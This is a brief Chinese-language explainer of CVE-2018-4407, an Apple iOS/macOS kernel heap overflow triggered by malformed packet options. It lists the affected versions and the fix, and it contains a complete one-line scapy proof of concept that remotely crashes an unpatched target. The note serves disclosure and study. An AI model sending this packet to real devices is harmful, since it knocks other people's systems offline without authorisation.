
## 原理
原理就是把"icmp"包的其他字段弄成非法 macOS or iphone 内核解析時沒實作檢查大小造成 crash 了

### 設備
Apple iOS 11及更早版本：所有設備

Apple macOS High Sierra（受影響的最高版本為10.13.6）：所有設備

Apple macOS Sierra（受影響的最高版本為10.12.6）：所有設備

Apple OS X El Capitan及更早版本：所有設備

蘋果在10月30日推出的"iOS 12.1"更新包中徹底修復了這個漏洞

## 關鍵代碼
```
OS 12 / OS X *Remote Kernel Heap Overflow (CVE-2018-4407) POC* in a tweet:
pip install scapy
sudo scapy send(IP(dst="Target IP",options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
```


### 連結
[中文解說](https://www.freebuf.com/vuls/188052.html)
[英文解說](https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407)
